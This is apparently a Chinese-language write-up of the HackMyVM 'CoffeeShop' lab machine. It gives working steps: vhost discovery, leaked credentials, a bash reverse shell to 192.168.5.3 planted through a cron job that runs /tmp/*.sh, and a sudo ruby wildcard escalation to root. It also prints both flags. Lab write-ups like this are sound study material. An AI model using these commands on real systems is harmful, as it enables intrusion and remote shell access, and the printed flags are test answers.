# CoffeeShop

2025.03.23 https://hackmyvm.eu/machines/machine.php?vm=CoffeeShop

[video]()

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

将 midnight.coffee 添加到 hosts。扫描发现 http://midnight.coffee/shop/login.php 登陆页面，但是没测试到注入或者弱密码。

主页上说网站正在建设中，那就再尝试爆破一下 vhost，发现 dev.midnight.coffee 的虚拟主机，访问 http://dev.midnight.coffee 发现用户登陆凭据 developer:developer 用这个凭据登陆 http://midnight.coffee/shop/login.php 发现 ssh 登陆凭据：

```
To login into the server use: tuna:1L0v3_TuN4_Very_Much
```

在 .bash_history 操作历史中发现这个文件/home/shopadmin/execute.sh 同时发现定时任务在执行这个脚本，发现它的内容为：

```
tuna@coffee-shop:~$ cat /home/shopadmin/execute.sh
#!/bin/bash

/bin/bash /tmp/*.sh
```

可以直接获得 root 权限：

```shell
echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' > /tmp/reverse.sh; chmod +x /tmp/reverse.sh
```

nc 创建监听，等待 1 分钟得到 shopadmin 权限反弹的 shell，先拿到 user flag：

```
shopadmin@coffee-shop:~$ cat user.txt
DR1NK1NG-C0FF33-4T-N1GHT
```

sudo -l 发现 `(root) NOPASSWD: /usr/bin/ruby * /opt/shop.rb`

ruby 后面跟的星号，可以执行任意的脚本，直接创建一个 rb 脚本：

```
echo 'Process::Sys.setuid(0); exec "/bin/sh"' > /tmp/rb.rb; chmod +x /tmp/rb.rb
sudo -u root /usr/bin/ruby /tmp/rb.rb /opt/shop.rb
```

拿到 root flag:

```
# cat root.txt
C4FF3331N-ADD1CCCTIONNNN
```
